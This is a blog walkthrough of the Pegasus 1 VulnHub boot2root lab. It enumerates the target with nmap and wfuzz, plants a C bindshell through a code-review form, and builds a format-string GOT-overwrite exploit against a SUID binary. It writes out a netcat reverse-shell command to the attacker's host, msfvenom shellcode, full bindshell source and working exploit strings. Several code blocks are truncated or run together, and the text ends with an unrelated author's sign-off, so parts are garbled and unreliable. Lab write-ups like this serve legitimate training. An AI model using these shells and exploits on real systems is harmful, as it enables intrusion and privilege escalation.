<p><a href="https://www.vulnhub.com/entry/pegasus-1,109/">Pegasus 1</a> is a boot2root hosted on <a href="https://www.vulnhub.com/">VulnHub</a> built by <a href="https://twitter.com/theknapsy">@TheKnapsy</a>. He wrote a <a href="http://knapsy.github.io/blog/2014/12/16/pegasus-has-arrived-my-first-boot2root-vm/">blogpost</a> about it too containing a small introduction with Pegasus as his first boot2root (hoof2root? ;p).</p>

<p>Having recently played in the <a href="https://leonjza.github.io/blog/2014/12/06/playing-in-the-playground-a-offsec-virtual-pentesting-labs-review/">Offsec Playground</a> a little after having completed my OSCP, I was relatively exhausted. Pegasus had its fair share of frustrations and had me digging around quite a bit. I did however learn a very valuable lesson&hellip; <em>again</em>. You will see this in the <strong>my_first</strong> section.</p>

<p>Like many other write ups I do, I will also recommend you try this one first before you read on. For me, Pegasus was definitely slightly more difficult than the usual VulnHub stuff you would see, but part of that may just as well be due to fatigue and that year end holiday mode ;p. However, that should not discourage you to give it a bash anyways!</p>

<p>Lets begin.</p>

<h2 id="nmap-again">nmap, again</h2>

<p>Starting a VM like this, you should almost have a knee-jerk reaction to reach for nmap as your first tool to use. A VM, hosted on the network, means you will probably be attacking this one&hellip; via the network. So after figuring out what the IP address is (via arp, netdiscover etc.), I threw nmap at it:</p>

<pre><code class="language-bash">root@kali:~# nmap --reason -sV 192.168.56.101 -p-

Starting Nmap 6.47 ( http://nmap.org ) at 2014-12-23 09:16 SAST

</code></pre>

<p><code>tcp/22</code>, <code>tcp/111</code>, <code>tcp/8088</code> and <code>tcp/55625</code>. Thats quite a bit to work with already. I decided to dive right into the web server that appears to be running on <code>tcp/8088</code>.</p>

<h2 id="stomping-some-hoofs-with-pegasus">stomping some hoofs with pegasus</h2>

<p>Browsing to <a href="http://192.168.56.101:8088/">http://192.168.56.101:8088/</a>, we are presented with a picture of Pegasus:</p>


<figure >
    
        <img src="https://leonjza.github.io/images/pegasus_web.png" />
    
    
</figure>


<p>I manually tried to browse to things like <code>robots.txt</code> etc, but everything responded with the same image. This was until I decided to browse to <code>index.php</code>, in an attempt to check that the web server is configured to serve PHP content:</p>


<figure >
    
        <img src="https://leonjza.github.io/images/pegasus_nginx_index.png" />
    
    
</figure>


<p>So this doesn’t exactly tell us PHP is supported yet, but it does get us somewhere if we wanted to brute force the web server in search of content. Inspecting the headers of the HTTP responses thus far, we would see that everything would return HTTP 200, however, <code>.php</code> scripts would 404 correctly. With that in mind, it was time to reach for <code>wfuzz</code> to discover some more.</p>

<pre><code class="language-bash">root@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/medium.txt  --hc 404 http://192.168.56.101:8088/FUZZ.php

</code></pre>

<p>And we have a HTTP 200 response for <code>submit.php</code>. So, I browsed to <a href="http://192.168.56.101:8088/submit.php:">http://192.168.56.101:8088/submit.php:</a></p>


<figure >
    
        <img src="https://leonjza.github.io/images/pegasus_submit.png" />
    
    
</figure>


<p>Well that isn&rsquo;t exactly useful. I played a little with the <code>submit.php</code> by sending a POST with some <code>--data</code>, but nothing useful came of it. Almost everything came back with <code>No data to process</code>.</p>

<p>Admittedly, this was my first hurdle. I was thinking if there is a <code>submit.php</code>, surely there is something that actually submits the appropriate data to it? So I pulled out some more wordlists and fed them to wfuzz to work on. I&rsquo;ll be honest, I did not like this part much. The wordlists were just too big and it almost felt like this is probably not the way to go about this. <code>wfuzz</code> was working with <code>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code>, when finally I get a HTTP 200 for <code>codereview.php</code>.</p>

<h2 id="pwning-mike">pwning mike</h2>

<p>So mike is apparently a trainee code reviewer. We have a form where we can submit code for him to check out. This is the form that submits the POST data <code>code</code> to the previously found <code>submit.php</code>.</p>

<p>Ok. Well this is a interesting one. My initial thoughts were that if Mike was checking out code, he is possibly executing it? There was however no hint on what language he is expecting, so the wild goose chase began.</p>

<p>PHP, Python, Perl, Ruby, Bash. Name them. I tried them all. Ok maybe not all, especially not brainfk. :D However, in all of them, I tried to get the language to execute <code>/bin/nc 192.168.56.102 4444 -e /bin/sh</code> or variants thereof so that it would connect to my netcat listener on my Kali machine, and spawn me a shell.</p>

<p>Eventually, I came to try some C. Admittedly, I was starting to rethink my strategy by now. That was until my C source had a call to <code>system()</code> in it:</p>


<figure >
    
        <img src="https://leonjza.github.io/images/pegasus_code_review_security.png" />
    
    
</figure>


<p>Ooooooh. Ok so that was a very obvious hint that I was getting closer. For me, this boiled down to it either accepting PHP due to <a href="http://php.net/manual/en/function.system.php">system</a>, or C due to its <a href="http://linux.die.net/man/3/system">system</a>. Obviously though, <code>system()</code> is being filtered out, so I would need an alternative.</p>

<p><em>insert fade to black</em></p>

<p><em>CAPTION: many hours later</em></p>

<p>After exhausting my PHP attempts, it was time to move to C. My first attempt was was something along the lines of</p>

<pre><code class="language-c">#include&lt;stdio.h&gt;

// msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f c
unsigned char buf[] =
&quot;\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80&quot;

&quot;\x0b\xcd\x80&quot;;

int main()
{
    int (*ret)() = (int(*)())buf;
    ret();
}
</code></pre>

<p>This was supposed to open me a <code>tcp/4444</code> shell, but to no avail. Infact, no shellcode related execution appeared to do anything. As a last resort before I figured I&rsquo;d need to get me some hints, I searched for some non-shellcode type bind shell generation C source. Unfortunately, I don’t write C socket software out of my head, but luckily Google came to the rescue and landed me on <a href="http://bigpointyteeth.se/code/bindshell.c">this</a>. I modified the code slightly by hardcoding my desired port and shell, and submitted it to be &lsquo;reviewed&rsquo;:</p>

<pre><code class="language-c">// Source: http://webcache.googleusercontent.com/search?q=cache:52EC4LfMJX4J:bigpointyteeth.se/code/bindshell.c+&amp;cd=11&amp;hl=en&amp;ct=clnk&amp;gl=za

int main(int argc, char *argv[]) {
    char msg[16];
    int srv_sockfd, new_sockfd;
    socklen_t new_addrlen;
    struct sockaddr_in srv_addr, new_addr;

    // fork into background
    if (fork() == 0) {
        if ((srv_sockfd = socket(PF_INET, SOCK_STREAM, 0)) &lt; 0) {
            return -1;
        }

        srv_addr.sin_family = PF_INET;
        srv_addr.sin_port = htons(atoi(&quot;4444&quot;));
        srv_addr.sin_addr.s_addr = htonl(INADDR_ANY);

        if (bind(srv_sockfd, (struct sockaddr *)&amp;srv_addr, sizeof(srv_addr)) &lt; 0) {
            return -1;
        }

        if (listen(srv_sockfd, 1) &lt; 0) {
            return -1;
        }

        // accept loop
        for (;;) {
            new_addrlen = sizeof(new_addr);
            new_sockfd = accept(srv_sockfd, (struct sockaddr *)&amp;new_addr, &amp;new_addrlen);
            if (new_sockfd &lt; 0) {
                return -1;
            }

            // fork to handle new connection
            if (fork() == 0) {
                // close old listener
                close(srv_sockfd);
                // print the parent pid which should be killed in order
                // to remove the persistant bindshell listener
                sprintf(msg, &quot;ppid=%d\n&quot;, getppid());
                write(new_sockfd, msg, strlen(msg));

                dup2(new_sockfd, 2);
                dup2(new_sockfd, 1);
                dup2(new_sockfd, 0);

                execl(SHELL, NAME, NULL);
                return 0;

            else
                close(new_sockfd);
        } // end accept loop
    } // end fork into background
    return 0;
}
</code></pre>

<p>All of my attempts were followed by a nmap on <code>tcp/4444</code> to see if the shell has become available. After submitting the above code, we got a new port open (this Mike guy is pretty fast you should hire him!):</p>

<pre><code class="language-bash">root@kali:~# nmap 192.168.56.101 -p 4444

<h2 id="my-first-your-first-we-all-first">my_first, your_first, we_all_first</h2>

<p>With my initial shell I was able to start enumerating Pegasus a little more. The most obvious next step was the SUID binary in <code>mike</code>&rsquo;s home (we will get to it shortly):</p>

<pre><code class="language-bash">mike@pegasus:~$ ls -lh
total 16K
-rwxr-xr-x 1 mike mike  845 Nov 18 20:52 check_code.sh

-rwsr-xr-x 1 john john 6.5K Nov 28 10:26 my_first
</code></pre>

<p>More enumeration revealed that <code>/opt/</code> had a number of interesting parts to it as well:</p>

<pre><code class="language-bash">mike@pegasus:~$ ls -lh /opt/
total 12K
drwxrwxrwx 2 root root 4.0K Dec 23 20:33 code_review

drwxr-xr-x 2 root root 4.0K Nov 18 14:43 nfs

<p>Piecing the web interface together, you will see that the submitted source is put into <code>code.c</code> in <code>/opt/code_review/</code>, and then compiled from the script in <code>/home/mike/check_code.sh</code> and eventually executed.</p>

<p>The <code>/opt/git/</code> folder had what looked like remnants of the typical <code>.git/</code> folders when you checkout code from a repo, but not the actual files itself. I poked around a bit, and was able to re-assemble the <code>main.c</code> file from the git history.</p>

<p>From the log we can see that there as an initial commit, and one more after that with some <em>security fixes</em>. Chances are, if we can see what the initial commit was then we can see the full initial code. So, lets check out the details of commit <em>0a8af1ed</em>:</p>

<p>Nice! We have a file <code>main.c</code> that was added. I copied the diff and saved it to <code>init.patch</code>, and then ran the patch:</p>

<pre><code class="language-bash">root@kali:~# patch -p1 &lt; init.diff

<p>That gives us the state of files after commit <em>0a8af1ed</em> which was labeled as the initial commit. The same process was followed for the next commit <em>85365946a8</em> which apparently included some <em>security fixes</em>. Copy the diff, make the .patch file and apply it. After this process, we have the sources up to where the git commit history has it.</p>

<p>I inspected that code before and after the security fixes commit, and noticed that the security fixes fixed a potential format string vulnerability. At least, that was the one my untrained eye was able to spot:</p>

<p><code>printf(err_check);</code> is the potentially vulnerable call&hellip; I think.</p>

<h3 id="the-calculator-with-a-hole">the calculator with a hole</h3>

<p>After toying with the git repository, my attention turned back to the SUID binary. When I run <code>my_first</code>, I am actually running it as <code>john</code>. This means, should I be able to exploit it and do things other than what its intended for, I may affectively gain <code>john</code>&rsquo;s privileges! Sounds easy right. :P</p>

<p>I quickly realized that the <code>main.c</code> file I got out of the git repository, was the sources for the <code>my_first</code> binary. So, my focus shifted to the piece of code I saw the security fix for.</p>

<p>First, it was time to confirm my suspicion of a format string vulnerability:</p>

<pre><code class="language-bash">mike@pegasus:~$ ./my_first

<p>I don’t like format string vulnerabilities. In fact not at all. I was hoping for something else and at this stage, I was happy I found the bug (which was the code before the security fixes btw), but sad that its a format string.</p>

<p>Anyways, feels aside, it was time to work on a exploit.</p>

<p>For the format string exploit, I don&rsquo;t think its really worth explaining all the details again. In fact, compiling this exploit, I was referring to a older blogpost about <a href="https://leonjza.github.io/blog/2014/08/09/beating-xerxes2/">Xerxes2</a> which also had a similar thing going. Feel free to check the binary section out there if the next part does not make much sense.</p>

<p><strong>EDIT</strong> I have since made a small asciinema showing the offset calculations on my Kali VM. Though the offsets are not the same the theory still applies. <script type="text/javascript" src="https://asciinema.org/a/14960.js" id="asciicast-14960" async data-theme="solarized-dark"></script></p>

<h3 id="punching-more-than-numbers">punching more than numbers</h3>

<p><em>So here, I had a pretty big freaking fail. A massive one. Once I had determined the stack position to start corrupting memory with, I was punching in the format strings in the application itself. Meaning, I was giving it the ASCII \x\x\x\x and not the actual bytes as would have been the case if I was using python/printf to redirect the stdout of them to <code>my_first</code>&rsquo;s stdin. Anyways, lessons were learnt, caffeine was injected. It wont happen again. Big up to <a href="https://twitter.com/barrebas">@barrebas</a> for subtly pointing the fail out ;p</em></p>

<p>As I had seen the source code, it was easy to formulate a plan for the exploit. I would make use of a ret2libc attack by overriding the GOT entry for <code>printf()</code> using the format string to <code>system()</code> instead. This means, the next time <code>printf()</code> is called, it would actually execute <code>system()</code> with the adjacent argument on the stack. Lets see how this was done.</p>

<h4 id="compiling-the-format-string">compiling the format string</h4>

<p>We know that the 2nd number that the applications wants triggers our format string. So, lets prepare some skeleton input, piping it to the <code>./my_first</code> binary to sample a successful run:</p>

<pre><code class="language-bash">mike@pegasus:~$ printf '1\n1\n1\n4\n' | ./my_first
WELCOME TO MY FIRST TEST PROGRAM

[1] Calculator
[2] String replay
[3] String reverse
[4] Exit

Selection:
Enter first number: Enter second number: Result: 1 + 1 = 2

Selection:
Goodbye!
</code></pre>

<p>Cool, so we have sampled adding 1 to 1 ;p Now we can get to exploiting the format string. The first step we have is to determine which parameter on the stack we have control of. We determine this by providing it with a string of 4 A&rsquo;s, and then incrementing the format string arguments by 1 until we can find the 4 A&rsquo;s. In my case, I will be formatting them as hex with <code>%x</code>, so I am searching for <code>41414141</code>. The format string will therefore start as <code>AAAA.0x%s</code>. Note that in the below example we are using 2 x percentages (2 x &lsquo;%&rsquo;) as it needs to be escaped in the shell:</p>

<pre><code class="language-bash">mike@pegasus:~$ printf '1\n1\nAAAA.0x%%x\n4\n' | ./my_first

Selection:

</code></pre>

<p>And we have the output of <code>AAAA.0xbff5321c</code>. Yay :)
Continuously incrementing this will eventually get you to argument 8, where you will find the clean string of hex A&rsquo;s:</p>

<pre><code class="language-bash">mike@pegasus:~$ printf '1\n1\nAAAA.0x%%x0x%%x0x%%x0x%%x0x%%x0x%%x0x%%x0x%%x\n4\n' | ./my_first

Selection:
Goodbye!
mike@pegasus:~$
</code></pre>

<p>So, using direct parameter access in the format string, we can reference parameter 8 directly:</p>

<pre><code class="language-bash">mike@pegasus:~$ printf '1\n1\nAAAA.0x%%8$x\n4\n' | ./my_first

Selection:
Enter first number: Enter second number: Error details: AAAA.0x41414141

mike@pegasus:~$
</code></pre>

<p>Parameter 8 in the format string is the start of the section on the stack we can read now, shown in the output <code>AAAA.0x41414141</code> of the format string <code>AAAA.0x%8$x</code>.</p>

<p>Now we will move on to making use of the <code>%n</code> format string to write to a arbitrary area in memory. Where do we want to write? To the GOT where the lookup for <code>printf()</code> occurs ofc! Lets dump the GOT for <code>./my_first</code>, and determine where it will go look for <code>printf()</code>:</p>

<pre><code class="language-bash">mike@pegasus:~$ objdump -R ./my_first

./my_first:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049bec R_386_GLOB_DAT    __gmon_start__
08049c20 R_386_COPY        stdin
08049bfc R_386_JUMP_SLOT   printf
08049c00 R_386_JUMP_SLOT   fgets
08049c04 R_386_JUMP_SLOT   puts
08049c08 R_386_JUMP_SLOT   __gmon_start__
08049c0c R_386_JUMP_SLOT   __libc_start_main
08049c10 R_386_JUMP_SLOT   putchar
08049c14 R_386_JUMP_SLOT   strtol
</code></pre>

<p>The location of <code>printf()</code> will be looked up at <code>08049bfc</code>. This is the part where we want to rewrite the address of <code>printf()</code> to that of libc&rsquo;s <code>system()</code>.</p>

<p>The last part we need is to know where <code>system()</code> actually is. An important vector that may influence this position in memory is known as ASLR, which will effectively cause the address of <code>system()</code> to be different every time <code>./my_first</code> is run. To combat this, a neat little trick to increase the stack size can be used using <code>ulimit</code>. <code>ulimit -s unlimited</code> will maximize the stack size, effectively causing the ASLR to be practically nonexistent:</p>

<pre><code class="language-bash">mike@pegasus:~$ ulimit -s
8192
mike@pegasus:~$ ulimit -s unlimited
mike@pegasus:~$ ulimit -s
unlimited
</code></pre>

<p>With the ASLR problem out of the way, lets leak the address of <code>system()</code>:</p>

<pre><code class="language-bash"># fire up gdb
mike@pegasus:~$ gdb -q ./my_first
Reading symbols from /home/mike/my_first...(no debugging symbols found)...done.

# set a break point as we enter main()
(gdb) b main
Breakpoint 1 at 0x804850f

# run the binary
(gdb) r
Starting program: /home/mike/my_first

Breakpoint 1, 0x0804850f in main ()

# leak the current address of system()
(gdb) p system
$1 = {&lt;text variable, no debug info&gt;} 0x40069060 &lt;system&gt;
(gdb)
</code></pre>

<p>And so we learn that <code>system()</code> lives at <code>0x40069060</code>. What does this all mean so far then? Well, we are now going to use the format string vulnerability to write (using <code>%n</code>) a new address for <code>printf()</code> in the GOT at <code>08049bfc</code> to point to <code>system()</code> at <code>0x40069060</code> instead of its real location.</p>

<p>For us to debug the application while we prepare the required padding for the format string, we will use the <code>printf()</code> used to pipe to <code>./my_first</code> to redirect to a file instead. Then, in <code>gdb</code>, we will run the binary, redirecting the input from the file we will compile with the <code>printf()</code>:</p>

<pre><code class="language-bash"># so, instead of the 4 x A's, we will now place the address
# in the GOT that we want to override, and use the %x format
# string to attempt writing to it
mike@pegasus:~$ printf '1\n1\n\xfc\x9b\x04\x08%%8$n' &gt; t
mike@pegasus:~$ file t
t: data

# then, in gdb, we will grab the output of the new file called
# t, and redirect it as input to my_first
mike@pegasus:~$ gdb -q ./my_first

# leak the current address that GOT points to for printf()
(gdb) x/x 0x08049bfc
0x8049bfc &lt;printf@got.plt&gt;: 0x080483b6

# run the binary with our exploit (t) as input
(gdb) r &lt; t

<p>This is working exactly as expected. Now all that is left is to pad the format string so that we can have the address <code>0x40069060</code> instead of <code>0x00000004</code> written. For the math etc involved, refer to the Xerxes2 post I previously mentioned. The resultant format string was <code>\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%44966u%%9$n</code>, with a run in the debugger ending in:</p>

Massive thanks and a big shoutout to @iMulitia for beta-breaking my VM and
providing first review.

Feel free to hit me up on Twitter @TheKnapsy or at #vulnhub channel on freenode
and leave some feedback, I would love to hear from you!

Also, make sure to follow @VulnHub on Twitter and keep checking vulnhub.com for
